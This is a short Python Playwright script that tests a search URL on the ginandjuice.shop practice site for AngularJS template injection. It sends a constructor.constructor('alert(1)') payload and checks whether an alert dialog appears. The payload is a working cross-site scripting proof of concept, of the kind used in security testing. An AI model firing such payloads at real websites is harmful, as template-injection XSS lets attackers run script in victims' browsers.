
import asyncio
from playwright.async_api import async_playwright

async def test_alert():
    url = "https://ginandjuice.shop/blog?search={{constructor.constructor('alert(1)')()}}"
    print(f"Testing URL: {url}")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        dialog_detected = False
        async def handle_dialog(dialog):
            nonlocal dialog_detected
            print(f"Dialog detected: {dialog.message}")
            dialog_detected = True
            await dialog.dismiss()
            
        page.on("dialog", handle_dialog)
        
        try:
            await page.goto(url, timeout=30000, wait_until="load")
            print("Page loaded. Waiting 10s...")
            await asyncio.sleep(10)
        except Exception as e:
            print(f"Error: {e}")
            
        print(f"Result: Dialog Detected = {dialog_detected}")
        await browser.close()

if __name__ == "__main__":
    asyncio.run(test_alert())
